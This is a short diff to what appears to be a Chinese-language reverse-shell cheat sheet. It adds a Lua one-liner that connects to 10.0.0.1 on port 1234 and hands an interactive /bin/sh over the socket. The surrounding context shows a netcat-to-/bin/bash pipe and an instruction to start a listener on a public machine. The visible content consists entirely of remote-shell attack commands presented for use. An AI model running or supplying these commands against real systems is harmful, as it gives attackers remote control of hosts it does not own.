@@ -63,6 +63,10 @@ nc 10.0.0.1 6666|/bin/bash|10.0.0.1 1234
 
 ```
 
+```lua
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+```
+
 在带有公网的机器上开启监听
 
 ```bash
